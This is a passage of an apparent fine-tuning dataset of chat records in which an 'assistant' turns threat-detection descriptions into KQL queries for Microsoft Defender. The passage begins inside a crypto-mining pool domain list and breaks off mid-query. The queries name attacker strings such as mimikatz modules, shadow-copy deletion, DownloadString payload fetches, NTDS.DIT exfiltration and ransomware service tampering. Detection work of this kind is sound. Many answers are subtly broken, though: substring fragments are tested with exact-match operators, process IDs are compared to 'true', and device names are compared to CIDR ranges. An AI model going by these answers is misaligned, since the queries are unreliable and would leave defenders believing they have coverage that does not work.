\"xmr.somec.cc\", \"xmr.suprnova.cc\", \"xmr.usa-138.com\", \"xmr.vip.pool.minergate.com\", \"xmr1min.monerpool.org\", \"xmrf.520fjh.org\", \"xmrf.fjhan.club\", \"xmrfast.com\", \"xmrigcc.graef.in\", \"xmrminer.cc\", \"xmrpool.de\", \"xmrpool.eu\", \"xmrpool.me\", \"xmrpool.net\", \"xmrpool.xyz\", \"xx11m.monerpool.org\", \"xx11mv2.monerpool.org\", \"xxx.hex7e4.ru\", \"zarabotaibitok.ru\", \"zer0day.ru\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the usage of binaries such as net, sc or powershell in order to stop, pause, disable or delete critical or important Windows services such as AV, Backup, etc. As seen being used in some ransomware scripts\n Topic: proc_creation_win_susp_service_tamper"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"143Svc\", \"Acronis VSS Provider\", \"AcronisAgent\", \"AcrSch2Svc\", \"AdobeARMservice\", \"AHS Service\", \"Antivirus\", \"Apache4\", \"ARSM\", \"aswBcc\", \"AteraAgent\", \"Avast Business Console Client Antivirus Service\", \"avast! Antivirus\", \"AVG Antivirus\", \"avgAdminClient\", \"AvgAdminServer\", \"AVP1\", \"BackupExec\", \"bedbg\", \"BITS\", \"BrokerInfrastructure\", \"CASLicenceServer\", \"CASWebServer\", \"Client Agent 7.60\", \"Core Browsing Protection\", \"Core Mail Protection\", \"Core Scanning Server\", \"DCAgent\", \"dwmrcs\", \"EhttpSr\", \"ekrn\", \"Enterprise Client Service\", \"epag\", \"EPIntegrationService\", \"EPProtectedService\", \"EPRedline\", \"EPSecurityService\", \"EPUpdateService\", \"EraserSvc11710\", \"EsgShKernel\", \"ESHASRV\", \"FA_Scheduler\", \"FirebirdGuardianDefaultInstance\", \"FirebirdServerDefaultInstance\", \"FontCache3.0.0.0\", \"HealthTLService\", \"hmpalertsvc\", \"HMS\", \"HostControllerService\", \"hvdsvc\", \"IAStorDataMgrSvc\", \"IBMHPS\", \"ibmspsvc\", \"IISAdmin\", \"IMANSVC\", \"IMAP4Svc\", \"instance2\", \"KAVFS\", \"KAVFSGT\", \"kavfsslp\", \"KeyIso\", \"klbackupdisk\", \"klbackupflt\", \"klflt\", \"klhk\", \"KLIF\", \"klim6\", \"klkbdflt\", \"klmouflt\", \"klnagent\", \"klpd\", \"kltap\", \"KSDE1.0.0\", \"LogProcessorService\", \"M8EndpointAgent\", \"macmnsvc\", \"masvc\", \"MBAMService\", \"MBCloudEA\", \"MBEndpointAgent\", \"McAfeeDLPAgentService\", \"McAfeeEngineService\", \"MCAFEEEVENTPARSERSRV\", \"McAfeeFramework\", \"MCAFEETOMCATSRV530\", \"McShield\", \"McTaskManager\", \"mfefire\", \"mfemms\", \"mfevto\", \"mfevtp\", \"mfewc\", \"MMS\", \"mozyprobackup\", \"mpssvc\", \"MSComplianceAudit\", \"MSDTC\", \"MsDtsServer\", \"MSExchange\", \"msftesq1SPROO\", \"msftesql$PROD\", \"msftesql$SQLEXPRESS\", \"MSOLAP$SQL_2008\", \"MSOLAP$SYSTEM_BGC\", \"MSOLAP$TPS\", \"MSOLAP$TPSAMA\", \"MSOLAPSTPS\", \"MSOLAPSTPSAMA\", \"mssecflt\", \"MSSQ!I.SPROFXENGAGEMEHT\", \"MSSQ0SHAREPOINT\", \"MSSQ0SOPHOS\", \"MSSQL\", \"MSSQLFDLauncher$\", \"MySQL\", \"NanoServiceMain\", \"NetMsmqActivator\", \"NetPipeActivator\", \"netprofm\", \"NetTcpActivator\", \"NetTcpPortSharing\", \"ntrtscan\", \"nvspwmi\", \"ofcservice\", \"Online Protection System\", \"OracleClientCache80\", \"OracleDBConsole\", \"OracleMTSRecoveryService\", \"OracleOraDb11g_home1\", \"OracleService\", \"OracleVssWriter\", \"osppsvc\", \"PandaAetherAgent\", \"PccNTUpd\", \"PDVFSService\", \"POP3Svc\", \"postgresql-x64-9.4\", \"POVFSService\", \"PSUAService\", \"Quick Update Service\", \"RepairService\", \"ReportServer\", \"ReportServer$\", \"RESvc\", \"RpcEptMapper\", \"sacsvr\", \"SamSs\", \"SAVAdminService\", \"SAVService\", \"ScSecSvc\", \"SDRSVC\", \"SearchExchangeTracing\", \"sense\", \"SentinelAgent\", \"SentinelHelperService\", \"SepMasterService\", \"ShMonitor\", \"Smcinst\", \"SmcService\", \"SMTPSvc\", \"SNAC\", \"SntpService\", \"Sophos\", \"SQ1SafeOLRService\", \"SQL Backups\", \"SQL Server\", \"SQLAgent\", \"SQLANYs_Sage_FAS_Fixed_Assets\", \"SQLBrowser\", \"SQLsafe\", \"SQLSERVERAGENT\", \"SQLTELEMETRY\", \"SQLWriter\", \"SSISTELEMETRY130\", \"SstpSvc\", \"storflt\", \"svcGenericHost\", \"swc_service\", \"swi_filter\", \"swi_service\", \"swi_update\", \"Symantec\", \"sysmon\", \"TeamViewer\", \"Telemetryserver\", \"ThreatLockerService\", \"TMBMServer\", \"TmCCSF\", \"TmFilter\", \"TMiCRCScanService\", \"tmlisten\", \"TMLWCSService\", \"TmPfw\", \"TmPreFilter\", \"TmProxy\", \"TMSmartRelayService\", \"tmusa\", \"Tomcat\", \"Trend Micro Deep Security Manager\", \"TrueKey\", \"UFNet\", \"UI0Detect\", \"UniFi\", \"UTODetect\", \"vds\", \"Veeam\", \"VeeamDeploySvc\", \"Veritas System Recovery\", \"vmic\", \"VMTools\", \"vmvss\", \"VSApiNt\", \"VSS\", \"W3Svc\", \"wbengine\", \"WdNisSvc\", \"WeanClOudSve\", \"Weems JY\", \"WinDefend\", \"wmms\", \"wozyprobackup\", \"WPFFontCache_v0400\", \"WRSVC\", \"wsbexchange\", \"WSearch\", \"wscsvc\", \"Zoolz 2 Service\")) and ((ProcessCommandLine contains \" delete \" or ProcessCommandLine contains \" pause \" or ProcessCommandLine contains \" stop \" or ProcessCommandLine contains \"Stop-Service \" or ProcessCommandLine contains \"Remove-Service \") or (ProcessCommandLine contains \"config\" and ProcessCommandLine contains \"start=disabled\")) and ((ProcessVersionInfoOriginalFileName in~ (\"net.exe\", \"net1.exe\", \"PowerShell.EXE\", \"psservice.exe\", \"pwsh.dll\", \"sc.exe\")) or (FolderPath endswith \"\\\\net.exe\" or FolderPath endswith \"\\\\net1.exe\" or FolderPath endswith \"\\\\powershell.exe\" or FolderPath endswith \"\\\\PsService.exe\" or FolderPath endswith \"\\\\PsService64.exe\" or FolderPath endswith \"\\\\pwsh.exe\" or FolderPath endswith \"\\\\sc.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potentially suspicious file downloads directly from IP addresses and stored in suspicious locations using Wget.exe Topic: proc_creation_win_wget_download_susp_locations"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine matches regex \"\\\\s-O\\\\s\" or ProcessCommandLine contains \"--output-document\") and ProcessCommandLine =~ \"http\" and (FolderPath endswith \"\\\\wget.exe\" or ProcessVersionInfoOriginalFileName =~ \"wget.exe\") and ProcessCommandLine matches regex \"://[0-9]{1,3}\\\\.[0-9]{1,3}\\\\.[0-9]{1,3}\\\\.[0-9]{1,3}\" and ((ProcessCommandLine contains \":\\\\PerfLogs\\\\\" or ProcessCommandLine contains \":\\\\Temp\\\\\" or ProcessCommandLine contains \":\\\\Users\\\\Public\\\\\" or ProcessCommandLine contains \":\\\\Windows\\\\Help\\\\\" or ProcessCommandLine contains \":\\\\Windows\\\\Temp\\\\\" or ProcessCommandLine contains \"\\\\Temporary Internet\") or (ProcessCommandLine contains \":\\\\Users\\\\\" and ProcessCommandLine contains \"\\\\Favorites\\\\\") or (ProcessCommandLine contains \":\\\\Users\\\\\" and ProcessCommandLine contains \"\\\\Favourites\\\\\") or (ProcessCommandLine contains \":\\\\Users\\\\\" and ProcessCommandLine contains \"\\\\Contacts\\\\\") or (ProcessCommandLine contains \":\\\\Users\\\\\" and ProcessCommandLine contains \"\\\\Pictures\\\\\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects creation of files with specific name patterns seen used in various tools that export the NTDS.DIT for exfiltration. Topic: file_event_win_ntds_exfil_tools"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName in~ (\"\\\\All.cab\", \".ntds.cleartext\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects suspicious children spawned via the Windows Terminal application which could be a sign of persistence via WindowsTerminal (see references section) Topic: proc_creation_win_windows_terminal_susp_children"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((InitiatingProcessFileName in~ (\"\\\\WindowsTerminal.exe\", \"\\\\wt.exe\")) and ((FolderPath endswith \"\\\\rundll32.exe\" or FolderPath endswith \"\\\\regsvr32.exe\" or FolderPath endswith \"\\\\certutil.exe\" or FolderPath endswith \"\\\\cscript.exe\" or FolderPath endswith \"\\\\wscript.exe\" or FolderPath endswith \"\\\\csc.exe\") or (FolderPath contains \"C:\\\\Users\\\\Public\\\\\" or FolderPath contains \"\\\\Downloads\\\\\" or FolderPath contains \"\\\\Desktop\\\\\" or FolderPath contains \"\\\\AppData\\\\Local\\\\Temp\\\\\" or FolderPath contains \"\\\\Windows\\\\TEMP\\\\\") or (ProcessCommandLine contains \" iex \" or ProcessCommandLine contains \" icm\" or ProcessCommandLine contains \"Invoke-\" or ProcessCommandLine contains \"Import-Module \" or ProcessCommandLine contains \"ipmo \" or ProcessCommandLine contains \"DownloadString(\" or ProcessCommandLine contains \" /c \" or ProcessCommandLine contains \" /k \" or ProcessCommandLine contains \" /r \"))) and (not(((ProcessCommandLine in~ (\"Import-Module\", \"Microsoft.VisualStudio.DevShell.dll\", \"Enter-VsDevShell\")) or (ProcessCommandLine in~ (\"\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.WindowsTerminal_\", \"\\\\LocalState\\\\settings.json\")) or (ProcessCommandLine in~ (\"C:\\\\Program Files\\\\Microsoft Visual Studio\\\\\", \"\\\\Common7\\\\Tools\\\\VsDevCmd.bat\")))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects registry value with specific intentional typo and strings seen used by the Small Sieve malware Topic: registry_set_malware_small_sieve_evasion_typo"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey endswith \"\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run*\" and (RegistryKey contains \"Microsift\" or RegistryValueData contains \".exe Platypus\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potential RDP connection via Mstsc using a local \".rdp\" file located in suspicious locations. Topic: proc_creation_win_mstsc_run_local_rdp_file_susp_location"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine endswith \".rdp\" or ProcessCommandLine endswith \".rdp\\\"\") and (FolderPath endswith \"\\\\mstsc.exe\" or ProcessVersionInfoOriginalFileName =~ \"mstsc.exe\") and (ProcessCommandLine in~ (\":\\\\Users\\\\Public\\\\\", \":\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color\", \":\\\\Windows\\\\System32\\\\Tasks_Migrated \", \":\\\\Windows\\\\Tasks\\\\\", \":\\\\Windows\\\\Temp\\\\\", \":\\\\Windows\\\\Tracing\\\\\", \"\\\\AppData\\\\Local\\\\Temp\\\\\", \"\\\\Downloads\\\\\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects outbound network connection initiated by Microsoft Dialer.\nThe Microsoft Dialer, also known as Phone Dialer, is a built-in utility application included in various versions of the Microsoft Windows operating system. Its primary function is to provide users with a graphical interface for managing phone calls via a modem or a phone line connected to the computer.\nThis is an outdated process in the current conext of its usage and is a common target for info stealers for process injection, and is used to make C2 connections, common example is \"Rhadamanthys\"\n Topic: net_connection_win_dialer_initiated_connection"}, {"role": "assistant", "content": "DeviceNetworkEvents\n| where (InitiatingProcessId =~ \"true\" and InitiatingProcessFolderPath =~ \":\\\\Windows\\\\System32\\\\dialer.exe\") and (not((InitiatingProcessRemoteSessionDeviceName in~ (\"127.0.0.0/8\", \"10.0.0.0/8\", \"172.16.0.0/12\", \"192.168.0.0/16\", \"169.254.0.0/16\", \"::1/128\", \"fe80::/10\", \"fc00::/7\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects a non-browser process communicating with the Notion API. This could indicate potential use of a covert C2 channel such as \"OffensiveNotion C2\" Topic: net_connection_win_domain_notion_api_susp_communication"}, {"role": "assistant", "content": "DeviceNetworkEvents\n| where RemoteUrl =~ \"api.notion.com\" and (not((InitiatingProcessFolderPath =~ \"\\\\brave.exe\" or (InitiatingProcessFolderPath in~ (\"C:\\\\Program Files\\\\Google\\\\Chrome\\\\Application\\\\chrome.exe\", \"C:\\\\Program Files (x86)\\\\Google\\\\Chrome\\\\Application\\\\chrome.exe\")) or (InitiatingProcessFolderPath startswith \"C:\\\\Program Files (x86)\\\\Microsoft\\\\EdgeWebView\\\\Application\\\\\" or InitiatingProcessFolderPath endswith \"\\\\WindowsApps\\\\MicrosoftEdge.exe\" or (InitiatingProcessFolderPath in~ (\"C:\\\\Program Files (x86)\\\\Microsoft\\\\Edge\\\\Application\\\\msedge.exe\", \"C:\\\\Program Files\\\\Microsoft\\\\Edge\\\\Application\\\\msedge.exe\"))) or (InitiatingProcessFolderPath in~ (\"C:\\\\Program Files (x86)\\\\Microsoft\\\\EdgeCore\\\\\", \"C:\\\\Program Files\\\\Microsoft\\\\EdgeCore\\\\\")) or (InitiatingProcessFolderPath in~ (\"C:\\\\Program Files\\\\Mozilla Firefox\\\\firefox.exe\", \"C:\\\\Program Files (x86)\\\\Mozilla Firefox\\\\firefox.exe\")) or (InitiatingProcessFolderPath in~ (\"C:\\\\Program Files (x86)\\\\Internet Explorer\\\\iexplore.exe\", \"C:\\\\Program Files\\\\Internet Explorer\\\\iexplore.exe\")) or InitiatingProcessFolderPath =~ \"\\\\maxthon.exe\" or InitiatingProcessFolderPath =~ \"\\\\AppData\\\\Local\\\\Programs\\\\Notion\\\\Notion.exe\" or InitiatingProcessFolderPath =~ \"\\\\opera.exe\" or InitiatingProcessFolderPath =~ \"\\\\safari.exe\" or InitiatingProcessFolderPath =~ \"\\\\seamonkey.exe\" or InitiatingProcessFolderPath =~ \"\\\\vivaldi.exe\" or InitiatingProcessFolderPath =~ \"\\\\whale.exe\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the use of Ngrok, a utility used for port forwarding and tunneling, often used by threat actors to make local protected services publicly available.\nInvolved domains are bin.equinox.io for download and *.ngrok.io for connections.\n Topic: proc_creation_win_pua_ngrok"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\" tcp 139\", \" tcp 445\", \" tcp 3389\", \" tcp 5985\", \" tcp 5986\")) or (ProcessCommandLine in~ (\" start \", \"--all\", \"--config\", \".yml\")) or ((ProcessCommandLine in~ (\" tcp \", \" http \", \" authtoken \")) and InitiatingProcessFolderPath =~ \"ngrok.exe\") or (ProcessCommandLine in~ (\".exe authtoken \", \".exe start --all\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the image load of VSS DLL by uncommon executables Topic: image_load_dll_vsstrace_susp_load"}, {"role": "assistant", "content": "DeviceImageLoadEvents\n| where FolderPath endswith \"\\\\vsstrace.dll\" and (not((((InitiatingProcessFolderPath in~ (\"C:\\\\Windows\\\\explorer.exe\", \"C:\\\\Windows\\\\ImmersiveControlPanel\\\\SystemSettings.exe\")) or (InitiatingProcessFolderPath startswith \"C:\\\\Windows\\\\System32\\\\\" or InitiatingProcessFolderPath startswith \"C:\\\\Windows\\\\SysWOW64\\\\\" or InitiatingProcessFolderPath startswith \"C:\\\\Windows\\\\Temp\\\\{\" or InitiatingProcessFolderPath startswith \"C:\\\\Windows\\\\WinSxS\\\\\" or InitiatingProcessFolderPath startswith \"C:\\\\ProgramData\\\\Package Cache\\\\{\")) or (InitiatingProcessFolderPath in~ (\"C:\\\\Program Files\\\\\", \"C:\\\\Program Files (x86)\\\\\")))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of CustomShellHost binary where the child isnt located in C:\\Windows\\explorer.exe Topic: proc_creation_win_lolbin_customshellhost"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFileName =~ \"\\\\CustomShellHost.exe\" and (not(FolderPath =~ \"C:\\\\Windows\\\\explorer.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potentially suspicious child process of applications launched from inside the WindowsApps directory. This could be a sign of a rogue \".appx\" package installation/execution Topic: proc_creation_win_susp_appx_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFileName =~ \"C:\\\\Program Files\\\\WindowsApps\\\\\" and ((ProcessCommandLine in~ (\"cmd /c\", \"Invoke-\", \"Base64\")) or (InitiatingProcessFolderPath in~ (\"\\\\cmd.exe\", \"\\\\cscript.exe\", \"\\\\mshta.exe\", \"\\\\powershell.exe\", \"\\\\pwsh.exe\", \"\\\\regsvr32.exe\", \"\\\\rundll32.exe\", \"\\\\wscript.exe\"))) and (not((InitiatingProcessFileName =~ \"\\\\WindowsTerminal.exe\" and (InitiatingProcessFolderPath in~ (\"\\\\powershell.exe\", \"\\\\cmd.exe\", \"\\\\pwsh.exe\")))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of certutil with the \"encode\" flag to encode a file to base64. This can be abused by threat actors and attackers for data exfiltration Topic: proc_creation_win_certutil_encode"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (FolderPath endswith \"\\\\certutil.exe\" or ProcessVersionInfoOriginalFileName =~ \"CertUtil.exe\") and (ProcessCommandLine contains \"-encode\" or ProcessCommandLine contains \"/encode\" or ProcessCommandLine contains \"\u2013encode\" or ProcessCommandLine contains \"\u2014encode\" or ProcessCommandLine contains \"\u2015encode\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potential DLL sideloading of \"chrome_frame_helper.dll\" Topic: image_load_side_load_chrome_frame_helper"}, {"role": "assistant", "content": "DeviceImageLoadEvents\n| where FolderPath endswith \"\\\\chrome_frame_helper.dll\" and (not((FolderPath startswith \"C:\\\\Program Files\\\\Google\\\\Chrome\\\\Application\\\\\" or FolderPath startswith \"C:\\\\Program Files (x86)\\\\Google\\\\Chrome\\\\Application\\\\\"))) and (not(FolderPath contains \"\\\\AppData\\\\local\\\\Google\\\\Chrome\\\\Application\\\\\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "The \"ScriptRunner.exe\" binary can be abused to proxy execution through it and bypass possible whitelisting Topic: proc_creation_win_lolbin_scriptrunner"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \" -appvscript \" and (FolderPath endswith \"\\\\ScriptRunner.exe\" or ProcessVersionInfoOriginalFileName =~ \"ScriptRunner.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the creation of a schedule task that runs weekly and execute the \"shutdown /l /f\" command.\nThis behavior was observed being used by KamiKakaBot samples in order to achieve persistence on a system.\n Topic: proc_creation_win_malware_kamikakabot_schtasks_persistence"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((ProcessCommandLine in~ (\" /create \", \"shutdown /l /f\", \"WEEKLY\")) and InitiatingProcessFolderPath =~ \"\\\\schtasks.exe\") and (not((InitiatingProcessAccountName in~ (\"AUTHORI\", \"AUTORI\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects Certipy execution, a tool for Active Directory Certificate Services enumeration and abuse based on PE metadata characteristics and common command line arguments.\n Topic: proc_creation_win_hktl_certipy"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (FolderPath endswith \"\\\\Certipy.exe\" or ProcessVersionInfoOriginalFileName =~ \"Certipy.exe\" or ProcessVersionInfoFileDescription contains \"Certipy\") or ((ProcessCommandLine in~ (\" account \", \" auth \", \" cert \", \" find \", \" forge \", \" ptt \", \" relay \", \" req \", \" shadow \", \" template \")) and (ProcessCommandLine in~ (\" -bloodhound\", \" -ca-pfx \", \" -dc-ip \", \" -kirbi\", \" -old-bloodhound\", \" -pfx \", \" -target\", \" -template\", \" -username \", \" -vulnerable\", \"auth -pfx\", \"shadow auto\", \"shadow list\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects user account creation on ESXi system via esxcli Topic: proc_creation_lnx_esxcli_user_account_creation"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"system \", \"account \", \"add \")) and InitiatingProcessFolderPath =~ \"/esxcli\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects usage of the crontab utility to remove the current crontab.\nThis is a common occurrence where cryptocurrency miners compete against each other by removing traces of other miners to hijack the maximum amount of resources possible\n Topic: proc_creation_lnx_crontab_removal"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \" -r\" and InitiatingProcessFolderPath =~ \"crontab\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects scheduled task creations or modification to be run with high privileges on a suspicious schedule type Topic: proc_creation_win_schtasks_schedule_type_system"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (FolderPath endswith \"\\\\schtasks.exe\" or ProcessVersionInfoOriginalFileName =~ \"schtasks.exe\") and (ProcessCommandLine in~ (\"NT AUT\", \" SYSTEM\", \"HIGHEST\")) and (ProcessCommandLine in~ (\" ONLOGON \", \" ONSTART \", \" ONCE \", \" ONIDLE \"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the creation of the LiveKD driver, which is used for live kernel debugging Topic: file_event_win_sysinternals_livekd_driver"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName =~ \"C:\\\\Windows\\\\System32\\\\drivers\\\\LiveKdD.SYS\" and (InitiatingProcessFolderPath in~ (\"\\\\livekd.exe\", \"\\\\livek64.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potential psexec command that initiate execution on a remote systems via common commandline flags used by the utility Topic: proc_creation_win_sysinternals_psexec_remote_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine in~ (\"accepteula\", \" -u \", \" -p \", \" \\\\\\\\\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects TOKEN OBFUSCATION technique from Invoke-Obfuscation Topic: proc_creation_win_powershell_token_obfuscation"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine matches regex \"\\\\w+`(\\\\w+|-|.)`[\\\\w+|\\\\s]\" or ProcessCommandLine matches regex \"\"(\\\\{\\\\d\\\\})+\"\\\\s*-f\" or ProcessCommandLine matches regex \"(?i)\\\\$\\\\{`?e`?n`?v`?:`?p`?a`?t`?h`?\\\\}\") and (not(ProcessCommandLine =~ \"${env:path}\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects a \"Get-Process\" cmdlet and its aliases on lsass process, which is in almost all cases a sign of malicious activity Topic: proc_creation_win_powershell_getprocess_lsass"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine in~ (\"Get-Process lsas\", \"ps lsas\", \"gps lsas\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects usage of the powerShell New-MailboxExportRequest Cmdlet to exports a mailbox to a remote or local share, as used in ProxyShell exploitations Topic: proc_creation_win_powershell_mailboxexport_share"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine in~ (\"New-MailboxExportRequest\", \" -Mailbox \", \" -FilePath \\\\\\\\\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of FSharp Interpreters \"FsiAnyCpu.exe\" and \"FSi.exe\"\nBoth can be used for AWL bypass and to execute F# code via scripts or inline.\n Topic: proc_creation_win_fsi_fsharp_code_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (FolderPath endswith \"\\\\fsi.exe\" or FolderPath endswith \"\\\\fsianycpu.exe\") or (ProcessVersionInfoOriginalFileName in~ (\"fsi.exe\", \"fsianycpu.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects an executable initiating a network connection to \"LocaltoNet\" tunneling sub-domains.\nLocaltoNet is a reverse proxy that enables localhost services to be exposed to the Internet.\nAttackers have been seen to use this service for command-and-control activities to bypass MFA and perimeter controls.\n Topic: net_connection_win_domain_localtonet_tunnel"}, {"role": "assistant", "content": "DeviceNetworkEvents\n| where InitiatingProcessId =~ \"true\" and (RemoteUrl in~ (\".localto.net\", \".localtonet.com\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects when an internet hosted webdav share is mounted using the \"net.exe\" utility Topic: proc_creation_win_net_use_mount_internet_share"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\" use \", \" http\")) and ((FolderPath endswith \"\\\\net.exe\" or FolderPath endswith \"\\\\net1.exe\") or (ProcessVersionInfoOriginalFileName in~ (\"net.exe\", \"net1.exe\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects a suspicious process creation as SYSTEM user (suspicious program or command line parameter) Topic: proc_creation_win_susp_system_user_anomaly"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (((InitiatingProcessAccountName in~ (\"AUTHORI\", \"AUTORI\")) and (InitiatingProcessIntegrityLevel in~ (\"System\", \"S-1-16-16384\"))) and ((FolderPath endswith \"\\\\calc.exe\" or FolderPath endswith \"\\\\cscript.exe\" or FolderPath endswith \"\\\\forfiles.exe\" or FolderPath endswith \"\\\\hh.exe\" or FolderPath endswith \"\\\\mshta.exe\" or FolderPath endswith \"\\\\ping.exe\" or FolderPath endswith \"\\\\wscript.exe\") or (ProcessCommandLine contains \" -NoP \" or ProcessCommandLine contains \" -W Hidden \" or ProcessCommandLine contains \" -decode \" or ProcessCommandLine contains \" /decode \" or ProcessCommandLine contains \" /urlcache \" or ProcessCommandLine contains \" -urlcache \" or (ProcessCommandLine contains \" -e\" and ProcessCommandLine contains \" JAB\") or (ProcessCommandLine contains \" -e\" and ProcessCommandLine contains \" SUVYI\") or (ProcessCommandLine contains \" -e\" and ProcessCommandLine contains \" SQBFAFgA\") or (ProcessCommandLine contains \" -e\" and ProcessCommandLine contains \" aWV4I\") or (ProcessCommandLine contains \" -e\" and ProcessCommandLine contains \" IAB\") or (ProcessCommandLine contains \" -e\" and ProcessCommandLine contains \" PAA\") or (ProcessCommandLine contains \" -e\" and ProcessCommandLine contains \" aQBlAHgA\") or ProcessCommandLine contains \"vssadmin delete shadows\" or ProcessCommandLine contains \"reg SAVE HKLM\" or ProcessCommandLine contains \" -ma \" or ProcessCommandLine contains \"Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\" or ProcessCommandLine contains \".downloadstring(\" or ProcessCommandLine contains \".downloadfile(\" or ProcessCommandLine contains \" /ticket:\" or ProcessCommandLine contains \"dpapi::\" or ProcessCommandLine contains \"event::clear\" or ProcessCommandLine contains \"event::drop\" or ProcessCommandLine contains \"id::modify\" or ProcessCommandLine contains \"kerberos::\" or ProcessCommandLine contains \"lsadump::\" or ProcessCommandLine contains \"misc::\" or ProcessCommandLine contains \"privilege::\" or ProcessCommandLine contains \"rpc::\" or ProcessCommandLine contains \"sekurlsa::\" or ProcessCommandLine contains \"sid::\" or 